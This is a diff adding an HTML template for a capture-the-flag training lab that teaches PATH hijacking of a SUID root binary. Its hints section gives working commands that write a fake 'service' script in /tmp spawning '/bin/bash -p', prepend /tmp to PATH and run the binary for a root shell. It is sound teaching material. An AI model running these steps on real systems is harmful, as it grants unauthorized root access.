@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1><i class="fas fa-road"></i> PATH Hijacking</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
+    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>A SUID binary calls another program without using an absolute path. Create a malicious version of the called program and manipulate PATH to escalate privileges.</p></div>
+    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Binary Analysis</h2>
+      <div class="code-block">
+        <h4>Target Binary: /usr/local/bin/status (SUID root)</h4>
+        <pre>
+$ strings /usr/local/bin/status
+...
+service apache2 status    ← calls "service" without absolute path!
+...
+
+$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+        </pre>
+      </div>
+      <div class="vulnerable-form" style="margin-top:1rem;">
+        <div style="margin-bottom:1rem;">
+          <label for="pathPayload">Malicious Script Content:</label>
+          <textarea id="pathPayload" rows="3" style="width:100%;background:var(--bg-dark);color:var(--text);border:1px solid var(--primary-dim);padding:0.5rem;font-family:monospace;" placeholder="#!/bin/bash\n/bin/bash -p">#!/bin/bash
+/bin/bash -p</textarea>
+        </div>
+        <div style="margin-bottom:1rem;">
+          <label for="pathDir">PATH Prefix Directory:</label>
+          <input type="text" id="pathDir" value="/tmp">
+        </div>
+        <button class="btn" onclick="exploitPath()"><i class="fas fa-play"></i> Execute Attack</button>
+      </div>
+      <div id="pathResults" class="result-box" style="margin-top:1rem;"></div>
+      <div class="code-block">
+        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
+        <pre>
+# PATH hijacking steps:
+# 1. Create malicious "service" in /tmp:
+echo '#!/bin/bash' > /tmp/service
+echo '/bin/bash -p' >> /tmp/service
+chmod +x /tmp/service
+
+# 2. Prepend /tmp to PATH:
+export PATH=/tmp:$PATH
+
+# 3. Run the SUID binary:
+/usr/local/bin/status
+# → Calls our malicious "service" as root!
+        </pre>
+      </div>
+    </div>
+    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('privesc-path','flagInput_path','flagResult_path'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_path" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_path" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+  <script>
+    async function exploitPath() {
+      const payload = document.getElementById('pathPayload').value;
+      const pathDir = document.getElementById('pathDir').value;
+      const resultsDiv = document.getElementById('pathResults');
+      resultsDiv.innerHTML = '<p style="color:var(--primary)"><i class="fas fa-spinner fa-spin"></i> Setting up PATH hijack...</p>';
+      try {
+        const res = await fetch('/api/labs/privesc/path', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ payload, pathDir }) });
+        const data = await res.json();
+        resultsDiv.innerHTML = '<pre style="color:' + (data.success ? '#00ff00' : 'var(--text)') + ';white-space:pre-wrap;">' + (data.output || data.error) + '</pre>';
+      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
+    }
+  </script>
+</body>
+</html>
